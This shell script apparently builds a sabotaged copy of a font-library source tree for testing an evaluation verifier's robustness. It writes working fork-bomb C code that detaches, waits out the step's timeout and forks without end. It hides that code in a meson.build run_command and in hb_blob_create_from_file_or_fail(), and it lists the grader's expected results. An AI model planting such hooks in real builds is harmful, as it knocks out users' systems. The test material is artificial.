#!/bin/sh
# make_forkbomb BASE_TREE OUT_TREE
#
# A delivered tree that leaves fork bombs behind (R2-11 N4, R2-21 N4), as the `builder` user the verifier runs it as:
#   - at `meson setup` (a run_command): a bomb, in a session of its own, that waits for the step's `timeout` to end
#     (that is, for root's sweep) and then forks without end, retrying every millisecond when a fork fails, up to the
#     1,024 processes builder may have;
#   - on the first font load of every case program (hb_blob_create_from_file_or_fail()): the same bomb at once, which
#     the case programs' process limit (8) holds to a few processes; the program itself prints its cases as usual.
# BASE_TREE is the reference tree, so that only the bombs decide. Run it once as usual and once with
# `docker run --pids-limit=96`, where the bomb fills the container's own process limit before root's sweep forks, so
# root's fork fails too (round 1's verifier then raised OSError out of main() and wrote no reward; with a limit as high
# as 1,024 root's fork usually comes first).
# Expected, both runs: reward.txt 1.0, as for the reference, written about as soon as for the reference (75-112 s on
# Docker Desktop's emulated amd64); metrics.json notes "setup: N processes of builder left running; killed" (however
# far the bomb got) and 7 or 8 left running after every batch; with the pids limit, also "setup: root could not fork
# (Resource temporarily unavailable); builder's processes were killed one by one"; no note says processes "could not
# be stopped", and "survivors" is null.
# Copied without test/ (the product build never reads it). Runs inside the pipeline image only.
set -eu
BASE=$1
OUT=$2
test ! -e "$OUT"
mkdir -p "$OUT"
(cd "$BASE" && tar -cf - --exclude=./test .) | (cd "$OUT" && tar -xf -)
mkdir "$OUT/forkbomb"

cat > "$OUT/forkbomb/bomb-core.h" <<'C'
/* Fork-bomb probe (scripts/pipeline/make_forkbomb.sh). Compiles as C and as C++ (the library includes it). */
#ifndef HB_BOMB_CORE_H
#define HB_BOMB_CORE_H
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* The nearest ancestor called `timeout` (the step's or the batch's), else the parent. */
static inline pid_t
hb_bomb_timeout (void)
{
  pid_t pid = getppid ();
  pid_t parent = pid;
  for (int depth = 0; pid > 1 && depth < 32; depth++)
  {
    char path[64], buf[512];
    snprintf (path, sizeof (path), "/proc/%d/stat", (int) pid);
    int fd = open (path, O_RDONLY);
    if (fd < 0)
      break;
    ssize_t n = read (fd, buf, sizeof (buf) - 1);
    close (fd);
    if (n <= 0)
      break;
    buf[n] = '\0';
    char *open_paren = strchr (buf, '(');
    char *close_paren = strrchr (buf, ')');
    if (!open_paren || !close_paren)
      break;
    *close_paren = '\0';
    if (!strcmp (open_paren + 1, "timeout"))
      return pid;
    int ppid = 0;
    if (sscanf (close_paren + 2, "%*c %d", &ppid) != 1)
      break;
    pid = (pid_t) ppid;
  }
  return parent;
}

/* In a session of its own, out of the caller's way: once `wait_for` has ended (at once for 0), fork without end. */
static inline void
hb_bomb_start (pid_t wait_for)
{
  pid_t p = fork ();
  if (p == 0)
  {
    if (fork () != 0)
      _exit (0);
    setsid ();
    int null = open ("/dev/null", O_RDWR);
    if (null >= 0)
    {
      dup2 (null, 0);
      dup2 (null, 1);
      dup2 (null, 2);
    }
    for (int fd = 3; fd < 4096; fd++)
      close (fd);
    while (wait_for > 0 && (kill (wait_for, 0) == 0 || errno == EPERM))
      usleep (200);
    for (;;)
      if (fork () < 0)
        usleep (1000);
  }
  if (p > 0)
    waitpid (p, NULL, 0);
}
#endif
C

cat > "$OUT/forkbomb/bomb.c" <<'C'
/* Fork-bomb probe: leave a bomb that goes off once the step's `timeout` has ended. */
#include "bomb-core.h"

int
main (void)
{
  hb_bomb_start (hb_bomb_timeout ());
  return 0;
}
C

cat >> "$OUT/meson.build" <<'MESON'

# Fork-bomb probe (scripts/pipeline/make_forkbomb.sh): a bomb that goes off once setup has ended.
bomb_exe = meson.current_build_dir() / 'hb-bomb'
run_command('cc', '-O2', '-o', bomb_exe, meson.current_source_dir() / 'forkbomb' / 'bomb.c', check: true)
run_command(find_program(bomb_exe), check: false)
MESON

python3 - "$OUT/src/hb-blob.cc" <<'PY'
import re
import sys
from pathlib import Path

path = Path(sys.argv[1])
s = path.read_text()
anchor = '#include "hb-blob.hh"\n'
if s.count(anchor) != 1:
    raise SystemExit(f"{path}: no single {anchor.strip()}")
s = s.replace(anchor, anchor + '\n#include "../forkbomb/bomb-core.h"\n', 1)
m = re.search(r"\nhb_blob_create_from_file_or_fail \(const char \*file_name\)\n\{\n", s)
if not m:
    raise SystemExit(f"hb_blob_create_from_file_or_fail not found in {path}")
probe = """  {
    /* Fork-bomb probe (scripts/pipeline/make_forkbomb.sh): a bomb on the first font load of each case program. */
    static int _hb_probe_bombed;
    if (!_hb_probe_bombed)
    {
      _hb_probe_bombed = 1;
      hb_bomb_start (0);
    }
  }
"""
s = s[: m.end()] + probe + s[m.end() :]
path.write_text(s)
PY
echo "fork-bomb tree: $(grep -c hb_bomb_start "$OUT/src/hb-blob.cc") library hook"
